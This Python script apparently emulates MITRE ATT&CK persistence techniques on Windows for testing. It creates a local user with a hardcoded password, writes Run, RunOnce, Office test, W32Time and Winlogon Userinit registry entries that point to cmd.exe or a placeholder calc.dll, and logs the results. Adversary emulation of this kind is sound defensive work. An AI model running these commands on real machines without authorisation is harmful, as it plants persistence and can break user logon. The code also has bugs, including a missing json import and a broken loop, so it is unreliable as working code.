import subprocess


# 10
PERSISTENCE_LOG = {
    'T1136' : {
        '001' : {}
    },
    'T1137' : {
        '002' : {}
    },
    'T1197' : {},
    'T1547' : {
        '001' : {},
        '003' : {},
        '004' : {},
        '005' : {},
        '008' : {},
        '010' : {},
        '014' : {}
    }
}

class Persistence:

    def __init__(self):
        pass
    
    def command_run(self, cmd):
        result = subprocess.Popen(cmd.split(' '), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
        try:
            result = result.decode('utf-8').split('\r\n')
        except UnicodeDecodeError as e:
            result = result.decode('cp949').split('\r\n')
        
        print(f'[+] {cmd}')
        for i in result:
            print(i)

        return result

    def persistence_run(self):
        with open('result.json', 'rt', encoding='utf-8') as f:
            data = json.load(f)

        self.T1136_001()

        self.T1137_002()

        self.T1197()

        self.T1547_001()
        self.T1547_003()

        data['result']['persistence_log'] = PERSISTENCE_LOG
        with open('result.json', 'wt', encoding='utf-8') as f:
            json.dump(data, f, indent=4)

    def T1136_001(self):
        cmd_list = [
            'net user t1136_001 P@assw0rd! /add',
            'net user',
            'net user t1136_001 /active:no'
        ]

        for idx, cmd in enumerate(cmd_list):
            result = self.command_run(cmd)

            PERSISTENCE_LOG['T1136']['001'][f'{idx + 1}'] = {
                'command' : cmd,
                'result' : result
            }
    
    def T1137_002(self):
        cmd = 'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf" /t REG_SZ /d "dll\\calc.dll"'
        result = self.command_run(cmd)

        PERSISTENCE_LOG['T1137']['002'] = {
            'command' : cmd,
            'result' : result
        }

    def T1197(self):
        cmd = 'sc query bits'
        result = self.command_run(cmd)

        PERSISTENCE_LOG['T1197'] = {
            'command' : cmd,
            'result' : result
        }

    def T1547_001(self):
        cmd_list = [
            "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v t1547_001 /d C:\\Windows\\System32\\cmd.exe /f",
            "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v t1547_001 /d C:\\Windows\\System32\\cmd.exe /f"
        ]

        for idx, cmd in cmd_list:
            result = self.command_run(cmd)

            PERSISTENCE_LOG['T1547']['001'][f'{idx + 1}'] = {
                'command' : cmd,
                'result' : result
            }

    def T1547_003(self):
        cmd = 'reg.exe add HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer /v DLLName /d dll\\calc.dll /f'

        result = self.command_run(cmd)

        PERSISTENCE_LOG['T1547']['003'] = {
            'command' : cmd,
            'result' : result
        }

    def T1547_004(self):
        cmd = 'reg.exe add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Userinit /d dll\\calc.dll /f'
        
        result = self.command_run(cmd)

        PERSISTENCE_LOG['T1547']['004'] = {
            'command' : cmd,
            'result' : result
        }

    def T1547_005(self):
        pass
    
    def T1547_008(self):
        pass
    
    def T1547_010(self):
        pass

    def T1547_014(self):
        pass
